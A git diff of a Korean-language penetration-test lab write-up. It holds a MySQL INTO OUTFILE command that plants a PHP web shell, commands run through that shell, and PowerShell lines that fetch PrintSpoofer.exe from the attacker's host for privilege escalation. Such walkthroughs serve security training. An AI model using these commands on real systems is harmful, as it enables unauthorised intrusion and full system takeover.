@@ -816,6 +816,13 @@ $(function() {
 
 ## 6. Hydra
 
+- phpinfo() button
+  ![phpinfo()](image_22.png)
+- fopen On
+  ![fopen](image_21.png)
+- server root fs
+- ![root fs](image_25.png)
+
 ```bash
 hydra -l root -P /usr/share/wordlists/...  (명령어 잘림, 원본 미확인)
 ```
@@ -1044,7 +1051,13 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 
 - MYSQL webshell output write
   ![web_shell_output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_6.png)
-- SELECT '<?php system($_GET["cm-----d"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
+
+- ![fs pwd](image_26.png)
+
+```sql
+SELECT '<?php system($_GET["cm-d"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
+```
+
 - 현재 웹 서비스가 wamp에서 진행된다고 가정하고 /wamp/www/ 경로에 생성 -> 일반적으로 wamp는 C:/wamp/www/ 을 사용하기 때문에 시도하기
 - nt authority\local service
   ![](image_17.png)
@@ -1055,10 +1068,12 @@ http://192.168.56.189:8080/shell.php?cmd=whoami
 ![](image_18.png)
 ![output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_7.png)
 
+nt authority\local service
+
 - local service -> 계정 탈취 성공 -> 일반적으로 기본 권한을 포함하는 경우가 많음 -> 가장 기능 활성화 확인
 - 최상위 SYSTEM 권한 탈취 필요
 
-http://192.168.56.189:8080/shell.php?cmd=whoami%20/priv
+http://192.168.56.189:8080/shell.php?cmd=whoami /priv
 
 ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_8.png)
 
@@ -1101,10 +1116,10 @@ SeTimeZonePrivilege Change the time zone Disabled
   python3 -m http.server 80
 
 - target
-  powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.112/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+  powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.56/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 
 ```ps1
-http://192.168.56.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.112/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+http://192.168.56.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.56/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 ```
 
 # 파일 없어서 실패 칼리에서 설치
@@ -1115,16 +1130,16 @@ sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoo
 ![install PrintSpoofer64.exe for SeImpersonatePrivilege enabled](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_13.png)
 
 ```ps1
-http://192.168.56.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.112/usr/share/windows-resources/binaries/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+http://192.168.56.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.56/usr/share/windows-resources/binaries/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 ```
 
 ![failed](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_15.png)
 
 # 아예 해당 파일 위치로 이동해서 python server on -> 그래도 안 되길래 그냥 파일을 / 로 옮기고 시도 -> 성공
 
-# 192.168.49.112 -> MyIP
+# 192.168.49.56 -> MyIP
 
-http://192.168.56.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.112/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+http://192.168.56.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.56/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 
 # 타겟으로 PrintSpoofer 역다운로드로 파일 이동 성공
 
